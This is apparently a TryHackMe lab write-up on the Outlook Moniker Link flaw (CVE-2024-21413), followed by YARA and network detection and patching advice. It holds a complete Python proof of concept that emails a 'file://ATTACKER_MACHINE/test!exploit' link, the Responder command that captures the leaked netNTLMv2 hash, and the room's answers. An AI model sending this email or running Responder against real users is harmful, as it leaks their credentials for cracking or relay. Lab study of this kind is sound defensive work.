
# Moniker Link (CVE-2024-21413)

**Leak user's credentials using CVE-2024-21413 to bypass Outlook's Protected View.**

- Room time: 30 min  
- Room popularity: ~69,000 views  
- Severity (CVSS): **Critical** (9.8)  
- Affects: Microsoft Office LTSC 2021 (from 19.0.0), Microsoft 365 Apps for Enterprise (from 16.0.1), Office 2019 (from 16.0.1), Office 2016 (from 16.0.0 before 16.0.5435.1001)

---

## Learning Objectives

* Understand how the Moniker Link bypass works and why Outlook's "Protected View" is bypassed.
* Build and run the proof-of-concept email that contains a Moniker Link.
* Capture the leaked netNTLMv2 hash using an SMB listener (Responder).
* Review detection options (YARA + packet capture) and remediation.

---

## Environment / Prerequisites

* TryHackMe AttackBox or Kali (with `responder` installed).
* A vulnerable VM (the lab provides an Outlook victim VM).
* Python 3 on AttackBox / Kali to run the PoC email script.
* `Responder` for capturing NTLM hashes on SMB.

**Lab credentials (Victim)**  
- Username: `tryhackme`  
- Password shown in lab UI (use provided VM credentials)

---

## Task 1 — Introduction & impact

This vulnerability lets a specially crafted `file://` Moniker Link bypass Outlook Protected View. When the victim clicks the malicious link Outlook will try to authenticate to the specified network path — which allows an attacker-controlled SMB server to capture the victim's `netNTLMv2` hash.

**Important notes:**

* Attack complexity: **Low**  
* Impact: **RCE & Credential leak** (lab focuses on credential leak via netNTLMv2)  
* There is publicly provided PoC available (author: CMNatic) — used in this room.

---

## Task 2 — How the Moniker Link bypass works (quick summary)

* Outlook renders HTML emails and can create hyperlinks that invoke OS-level protocols (e.g., `file://`).
* Outlook normally blocks dangerous external app launches via **Protected View**, showing a warning.
* The Moniker Link crafted for CVE-2024-21413 injects a special character (`!`) + text into the `file://` target which causes Outlook to attempt to access an SMB share while skipping the Protected View block — resulting in an authentication attempt from Outlook to the attacker's SMB server.
* The SMB authentication attempt carries the victim's `netNTLMv2` hash, which can be captured by an SMB listener like `Responder`.

**Example HTML (vulnerable):**
```html
<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
````

Note the `!exploit` suffix after the path. This is the trick used in the PoC to trigger the bypass in Outlook clients vulnerable to CVE-2024-21413.

---

## Task 3 — Exploitation (hands-on)

### Step A — Start an SMB listener with Responder on the AttackBox

1. Open a terminal on your AttackBox.
2. Start Responder on the AttackBox interface (example interface: `ens5` on TryHackMe AttackBox):

```bash
# start responder listening on your network interface
sudo responder -I ens5
```

You should see Responder banner output and then it will be `Listening for events...`.

> If you're using your own machine, replace `ens5` with the correct interface (e.g., `eth0`, `wlan0`, etc).

---

### Step B — Prepare the PoC email script on the AttackBox

Create a Python script (e.g., `exploit.py`) on the AttackBox and update the placeholders:

* Replace `ATTACKER_MACHINE` (line that builds the `file://` URL) with your AttackBox IP.
* Replace `MAILSERVER` with the SMTP server IP or hostname used in the lab (the lab instructions provide values or you can use the AttackBox local mail server if provided).
* The lab password for the attacker mail account is `attacker` (in the TryHackMe PoC environment) — enter that when the script prompts.

**Complete commented PoC (copy into `exploit.py`)**

```python
#!/usr/bin/env python3
"""
PoC: Moniker Link email sender
Author: CMNatic (example)
Purpose: send an HTML email with a Moniker Link that triggers CVE-2024-21413 behavior
Notes:
 - Replace MAILSERVER with your mailserver / AttackBox IP
 - Replace ATTACKER_MACHINE with the IP of the machine running Responder
 - When prompted, enter the attacker's email account password (lab uses "attacker")
"""

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

# ---------- CONFIGURATION (edit these) ----------
# The "from" address for the email (attacker controlled)
sender_email = 'attacker@monikerlink.thm'   # change if needed

# The victim email (in the lab this is preconfigured)
receiver_email = 'victim@monikerlink.thm'  # the mailbox on the victim VM

# The SMTP server to send through (replace with lab's mailserver or AttackBox mailserver)
MAILSERVER = 'MACHINE_IP'  # replace with the AttackBox / mailserver IP provided by the lab
MAILPORT = 25

# ---------- END CONFIGURATION -------------------

# ask for the attacker's mail password to authenticate to the SMTP server
password = input("Enter your attacker email password: ")

# Construct the HTML body with the Moniker Link.
# IMPORTANT: modify ATTACKER_MACHINE to your listener IP.
# The critical part is 'file://ATTACKER_MACHINE/test!exploit' — note the exclamation mark (!) suffix.
html_content = """\
<!DOCTYPE html>
<html lang="en">
  <body>
    <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
  </body>
</html>
"""

# Build the MIME message
message = MIMEMultipart('alternative')
message['Subject'] = "CVE-2024-21413"
message['From'] = formataddr(('CMNatic', sender_email))
message['To'] = receiver_email

# Attach the HTML content to the message
msg_html = MIMEText(html_content, 'html')
message.attach(msg_html)

# Send the email via the configured SMTP server
try:
    server = smtplib.SMTP(MAILSERVER, MAILPORT, timeout=10)
    server.ehlo()
    # If authentication is required, log in. Some lab setups require it.
    try:
        server.login(sender_email, password)
    except Exception:
        # Authentication may not be required or may fail depending on the lab setup.
        # We still attempt to send the email below.
        pass

    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("[+] Email delivered")

except Exception as err:
    print("[!] Error sending email:", err)
finally:
    try:
        server.quit()
    except Exception:
        pass
```

**How to run:**

```bash
# edit exploit.py: replace MAILSERVER and ATTACKER_MACHINE with correct values
nano exploit.py

# run
python3 exploit.py
# when prompted: "Enter your attacker email password:" type: attacker
```

If the script prints `"[+] Email delivered"` the victim should receive the message in Outlook.

---

### Step C — Open Outlook on the victim VM and click the Moniker Link

* On the victim VM (the lab's Outlook VM), open Outlook (pre-configured in the lab).
* Locate the test email and click the `Click me` link.
* Outlook will attempt to access the `file://` path — due to the `!exploit` suffix the Protected View is bypassed (in vulnerable clients) and Outlook will try SMB authentication to the `ATTACKER_MACHINE` address.

---

### Step D — Check Responder output on the AttackBox

On your AttackBox Responder terminal you should see logs similar to:

```
[SMB] NTLMv2-SSP Client  : ::ffff:10.10.224.117
[SMB] NTLMv2-SSP Username: THM-MONIKERLINK\tryhackme
[SMB] NTLMv2-SSP Hash    : tryhackme::THM-MONIKERLINK:4dba3ba705ddff18:AAE6BB3...
```

* The `NTLMv2` response (netNTLMv2) is printed. This is what the attacker captures and can attempt to crack offline or pass to relay tools (if allowed in the environment).

---

## Task 4 — Detection

### YARA detection

A YARA rule was authored (example by Florian Roth) to detect suspicious emails containing `file:\\` sequences suitable for Moniker Link exploitation. An example rule structure (lab shows a rule file `cve-2024-21413.yar`):

```text
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
  meta:
    description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"
    author = "X_Junior, Florian Roth"
    reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
    date = "2024-02-17"
    modified = "2024-02-19"
    score = 75

  strings:
    $a1 = "Subject: "
    $a2 = "Received: "
    $xr1 = /file:\\\\\/\\[^^\\]{6,600}\\.(docx|txt|pdf|xls|pptx|odt|jpg|png|gif|bmp|tiff|...)/

  condition:
    filesize < 1000KB and all of ($a*) and 1 of ($xr*)
}
```

> The YARA rule looks for `file:\\` patterns and common office/file extensions to detect suspicious messages containing `file://` links.

### Network detection (Wireshark)

If you capture traffic (on a span/host or on an endpoint), the SMB negotiation and `NTLMSSP` fields contain the auth exchange and truncated netNTLMv2 hash. Look for `Session Setup` / `NTLMSSP` frames in Wireshark and the `NTLMSSP` fields (domain, username, challenge, response).

---

## Task 5 — Remediation & Mitigation

* **Apply vendor patch**: Microsoft released patches in the February update — update Office via Windows Update or Microsoft Update Catalog. This is the primary fix.
* **User guidance / training**: Do not click unknown links, especially `file://` links from untrusted senders.
* **Network controls**: Consider blocking outbound SMB (`TCP/UDP 445`) or restricting SMB to trusted subnets. However, blocking SMB entirely may break legitimate functionality, so assess impact before blocking.
* **Email gateway**: Use email filtering to block suspicious `file://` URIs and attachments or to flag messages with OS-level protocol handlers.
* **Detection**: Deploy YARA scanning for emails and monitor SMB authentication attempts for unusual sources.

---

## Task 6 — Conclusion

* CVE-2024-21413 allows credential leakage when Outlook opens a Moniker Link crafted with the `!` suffix.
* The attack's low complexity and wide Office deployment make this highly impactful — patch promptly.
* The lab demonstrates the end-to-end flow: PoC email → Outlook click → Responder capture of `netNTLMv2`.

---

## Quick Reference — Commands & Artifacts

**Start Responder (attack box)**:

```bash
sudo responder -I ens5
```

**Run PoC**:

```bash
# edit exploit.py to set MAILSERVER and ATTACKER_MACHINE
python3 exploit.py
# enter attacker when prompted (lab password)
```

**Responder expected output**:

* NTLMv2 entries in Responder terminal:

  ```
  [SMB] NTLMv2-SSP Client  : ::ffff:10.10.224.117
  [SMB] NTLMv2-SSP Username: THM-MONIKERLINK\tryhackme
  [SMB] NTLMv2-SSP Hash    : ...
  ```

**Detection**:

* YARA rule file: `cve-2024-21413.yar`
* Inspect SMB traffic with Wireshark for `NTLMSSP` messages.

---

## Lab Answers (from screenshots)

* **Severity rating**: `Critical`
* **Moniker Link type**: `file://`
* **Special character used to bypass Protected View**: `!` (exclamation mark)
* **Tool used on AttackBox to capture hashes**: `responder`
* **Captured hash type**: `netNTLMv2`

---

## Notes / Caveats

* The PoC above demonstrates credential capture. It **does not** show RCE in this lab (the RCE part is outside the lab scope).
* Always run offensive tools in authorized lab environments only.
* When testing on your infrastructure, coordinate and get approvals.

---

## References

* Microsoft advisory: CVE-2024-21413 (MSRC)
* PoC author: CMNatic (example)
* Detection rule example: Florian Roth (YARA rule)

---

**End of Moniker Link (CVE-2024-21413) — Lesson**
